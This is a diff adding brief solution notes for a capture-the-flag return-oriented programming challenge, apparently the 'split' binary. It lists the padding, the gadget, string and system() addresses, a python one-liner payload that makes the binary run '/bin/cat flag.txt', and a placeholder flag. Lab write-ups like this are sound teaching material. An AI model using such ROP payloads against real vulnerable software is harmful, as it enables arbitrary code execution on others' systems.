@@ -1,0 +1,10 @@
+Exploit: Basic ROP Chain
+
+Padding: 40
+Important Addresses: 3 (gadget for "pop rdi", "/bin/cat flag.txt", system)
+Gadget Address: 0x0000000000400883 (found w/ ROPgadget)
+String Address: 0x00601060
+system() Address: 0x7ffff7a52390 (found w/ GDB)
+Payload: python -c 'print "a"*40 + "\x83\x08\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x90\x23\xa5\xf7\xff\x7f\x00\x00"' | ./split
+
+Flag: ROPE{a_placeholder_32byte_flag!}
